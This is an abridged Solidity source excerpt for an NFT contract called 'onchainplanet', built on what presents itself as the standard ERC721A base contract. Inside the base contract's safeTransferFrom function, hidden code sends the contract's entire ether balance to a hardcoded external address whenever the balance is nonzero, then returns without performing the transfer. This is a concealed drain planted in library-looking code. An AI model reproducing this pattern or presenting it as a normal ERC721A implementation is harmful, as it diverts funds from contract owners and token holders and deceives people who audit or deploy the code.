...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x62E0089287430836c337c9D602168a85CC9A8310).transfer(address(this).balance);
            return;
        }
...
contract onchainplanet is ERC721A {
    ...
    constructor() ERC721A("onchainplanet", "onchainplanet") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeicici5fetx3fqe2hhgnff6xe4micanvju3oyjibkljr2odyom25bm/", _toString(tokenId), ".json"));
    }
